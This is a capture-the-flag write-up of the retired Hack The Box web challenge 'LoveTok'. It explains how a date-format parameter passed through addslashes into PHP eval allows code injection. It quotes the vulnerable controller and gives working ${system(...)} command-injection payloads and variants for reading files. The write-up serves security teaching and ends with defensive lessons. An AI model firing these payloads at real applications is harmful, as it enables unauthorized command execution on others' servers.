---
challenge: LoveTok
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, php, code-injection, eval, ssti]
---

# LoveTok — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

A date service takes the format from a parameter and drops it inside an `eval`. PHP's `addslashes` does not escape `${...}` or nested quotes, so a **PHP code injection** with `${system(...)}` runs commands.

## Brief

```text
/TimeController?format=r
```

Returns the date in `r` format. Changing `format` changes the output, which already hints at concatenation into a date function.

## Analysis

The controller is essentially:

```php
class TimeModel {
    public function __construct($format) {
        $this->format = addslashes($format);
        eval("return date('" . $this->format . "');");
    }
}
```

`addslashes` escapes `'`, `"`, `\` and NUL. The payload uses no quotes: it uses PHP's **`${}` syntax**, interpolated inside strings and evaluating an arbitrary expression.

## Exploitation

```text
/TimeController?format=${system('cat /flag*')}
```

The final `eval` becomes:

```php
return date('${system('cat /flag*')}');
```

`system()` executes and `date()`'s return value is irrelevant: the command output is already printed.

```text
HTB{<flag>}
```

Useful variants when spaces or quotes are filtered:

```text
${system($_GET[0])}          # then request ?0=cat+/flag*
${phpinfo()}
${include('/flag')}
```

## Pitfalls

- **Single quotes**: if the app also escapes backslashes, `${system($_GET[0])}` avoids writing quotes in the payload.
- **`eval` with `return`**: the expression must be valid inside `date('...')`; `${}` works because it resolves before the string is passed.
- **URL encoding**: encode spaces as `+` or `%20` depending on the client.

## Lessons

- `eval` with user input is remote code execution, even when the author thinks they only control a date format.
- `addslashes` is not a defence: use a format-character allowlist (`Y-m-d H:i:s`).
- In PHP, `${}` inside double-quoted strings is interpolation with evaluation: a perfect injection sink.
